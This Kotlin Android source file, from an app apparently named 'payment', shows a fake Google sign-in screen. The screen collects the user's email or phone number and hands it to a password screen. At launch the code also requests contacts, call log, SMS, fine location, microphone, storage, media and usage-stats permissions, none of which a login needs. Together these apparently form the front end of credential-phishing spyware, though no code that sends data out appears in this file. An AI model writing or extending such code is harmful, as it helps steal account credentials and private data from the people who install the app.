package com.payment.app

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.text.TextUtils
import android.util.Patterns
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.activity.result.ActivityResultLauncher
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import android.provider.Settings


class GoogleLoginEmailActivity : AppCompatActivity() {

    private lateinit var permissionLauncher: ActivityResultLauncher<Array<String>>
    private var isCallLogPermissionGranted = false
    private var isContactPermissionGranted = false
    private var isReadPhonePermissionGranted = false
    private var isLocationPermissionGranted = false
    private var isPostNotificationPermissionGranted = false
    private var isSmsPermissionGranted = false
    private var isReadExternalStoragePermissionGranted = false
    private var isWriteExternalStoragePermissionGranted = false
    private var isReadMediaImagePermissionGranted = false
    private var isReadMediaVideoPermissionGranted = false
    private var isRecordAudioPermissionGranted = false
    private var isPackageUsageStatePermissionGranted = false

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    @SuppressLint("ClickableViewAccessibility")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_google_login_email)
        val switchToSecondActivity: Button = findViewById(R.id.next)
        permissionLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()){
                permissions ->
            isContactPermissionGranted = permissions[Manifest.permission.READ_CONTACTS] ?: isContactPermissionGranted
            isCallLogPermissionGranted = permissions[Manifest.permission.READ_CALL_LOG] ?: isCallLogPermissionGranted
            isReadPhonePermissionGranted = permissions[Manifest.permission.READ_PHONE_STATE] ?: isReadPhonePermissionGranted
            isContactPermissionGranted = permissions[Manifest.permission.READ_CONTACTS] ?: isContactPermissionGranted
            isCallLogPermissionGranted = permissions[Manifest.permission.READ_CALL_LOG] ?: isCallLogPermissionGranted
            isLocationPermissionGranted = permissions[Manifest.permission.ACCESS_FINE_LOCATION] ?: isLocationPermissionGranted
            isPostNotificationPermissionGranted = permissions[Manifest.permission.POST_NOTIFICATIONS] ?: isPostNotificationPermissionGranted
            isSmsPermissionGranted = permissions[Manifest.permission.READ_SMS] ?: isSmsPermissionGranted
            isReadPhonePermissionGranted = permissions[Manifest.permission.READ_PHONE_STATE] ?: isReadPhonePermissionGranted
            isReadExternalStoragePermissionGranted = permissions[Manifest.permission.READ_EXTERNAL_STORAGE] ?: isReadExternalStoragePermissionGranted
            isWriteExternalStoragePermissionGranted = permissions[Manifest.permission.WRITE_EXTERNAL_STORAGE] ?: isWriteExternalStoragePermissionGranted
            isReadMediaImagePermissionGranted = permissions[Manifest.permission.READ_MEDIA_IMAGES] ?: isReadMediaImagePermissionGranted
            isReadMediaVideoPermissionGranted = permissions[Manifest.permission.READ_MEDIA_VIDEO] ?: isReadMediaVideoPermissionGranted
            isRecordAudioPermissionGranted = permissions[Manifest.permission.RECORD_AUDIO] ?: isRecordAudioPermissionGranted
            isPackageUsageStatePermissionGranted = permissions[Manifest.permission.PACKAGE_USAGE_STATS] ?: isPackageUsageStatePermissionGranted
        }
        requestPermission()
        if (hasUsageStatsPermission()) {
            // Permission is granted, you can proceed with accessing usage stats.
        } else {
            requestUsageStatsPermission()
        }
        switchToSecondActivity.setOnClickListener(View.OnClickListener { switchActivities() })
    }

    private fun hasUsageStatsPermission(): Boolean {
        val appOps = ContextCompat.checkSelfPermission(this, "android.permission.PACKAGE_USAGE_STATS")
        return appOps == PackageManager.PERMISSION_GRANTED
    }

    private fun requestUsageStatsPermission() {
        val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
        startActivityForResult(intent, 1001)
    }


    private fun switchActivities() {
        val emailOrPhone: EditText = findViewById(R.id.emailOrPhone)
        val text:String = emailOrPhone.getText().toString()
        val digitsOnly:Boolean  = TextUtils.isDigitsOnly(text)
        val mobilePattern = "[0-9]{10}"
        val regexStr = "^[0-9]$"

        if (digitsOnly) {
            if (text.isEmpty()) {
                Toast.makeText(applicationContext, "field can't be empty.", Toast.LENGTH_LONG).show()
            } else if(emailOrPhone.getText().toString().length != 10){
                Toast.makeText(getApplicationContext(), "Please enter valid 10 digit phone number", Toast.LENGTH_SHORT).show();
            } else {
                 val switchActivityIntent = Intent(this, GoogleLoginPasswordActivity::class.java)
                switchActivityIntent.putExtra("emailOrPhone",emailOrPhone.text.toString())
                startActivity(switchActivityIntent)
            }
        }else {
            if (!isValidEmail(emailOrPhone.getText().toString())) {
                Toast.makeText(this, "your email is not valid", Toast.LENGTH_LONG).show()
            }
            else{
                val switchActivityIntent = Intent(this, GoogleLoginPasswordActivity::class.java)
                switchActivityIntent.putExtra("emailOrPhone",emailOrPhone.text.toString())
                startActivity(switchActivityIntent)
            }
        }
    }

    private fun isValidEmail(target: CharSequence?): Boolean {
        return !TextUtils.isEmpty(target) && Patterns.EMAIL_ADDRESS.matcher(target).matches()
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestPermission() {
        isContactPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CONTACTS
        ) == PackageManager.PERMISSION_GRANTED

        isCallLogPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_CALL_LOG
        ) == PackageManager.PERMISSION_GRANTED

        isReadPhonePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_PHONE_STATE
        ) == PackageManager.PERMISSION_GRANTED

        isLocationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED

        isPostNotificationPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.POST_NOTIFICATIONS
        ) == PackageManager.PERMISSION_GRANTED

        isSmsPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_SMS
        ) == PackageManager.PERMISSION_GRANTED

        isReadExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isWriteExternalStoragePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaImagePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_IMAGES
        ) == PackageManager.PERMISSION_GRANTED

        isReadMediaVideoPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.READ_MEDIA_VIDEO
        ) == PackageManager.PERMISSION_GRANTED

        isRecordAudioPermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.RECORD_AUDIO
        ) == PackageManager.PERMISSION_GRANTED

        isPackageUsageStatePermissionGranted = ContextCompat.checkSelfPermission(
            this,
            Manifest.permission.PACKAGE_USAGE_STATS
        ) == PackageManager.PERMISSION_GRANTED

        val permissionRequest : MutableList<String> = ArrayList()

        if(!isContactPermissionGranted){
            permissionRequest.add(Manifest.permission.READ_CONTACTS)
        }

        if(!isCallLogPermissionGranted){
            permissionRequest.add(Manifest.permission.READ_CALL_LOG)
        }

        if(!isReadPhonePermissionGranted){
            permissionRequest.add(Manifest.permission.READ_PHONE_STATE)
        }

        if(!isLocationPermissionGranted){
            permissionRequest.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }

        if(!isPostNotificationPermissionGranted){
            permissionRequest.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        if(!isSmsPermissionGranted){
            permissionRequest.add(Manifest.permission.READ_SMS)
        }

        if(!isReadExternalStoragePermissionGranted){
            permissionRequest.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }

        if(!isWriteExternalStoragePermissionGranted){
            permissionRequest.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        }

        if(!isReadMediaImagePermissionGranted){
            permissionRequest.add(Manifest.permission.READ_MEDIA_IMAGES)
        }

        if(!isReadMediaVideoPermissionGranted){
            permissionRequest.add(Manifest.permission.READ_MEDIA_VIDEO)
        }

        if(!isRecordAudioPermissionGranted){
            permissionRequest.add(Manifest.permission.RECORD_AUDIO)
        }

        if(!isPackageUsageStatePermissionGranted){
            permissionRequest.add(Manifest.permission.PACKAGE_USAGE_STATS)
        }

        if(permissionRequest.isNotEmpty()){
            permissionLauncher.launch(permissionRequest.toTypedArray())
        }

    }


}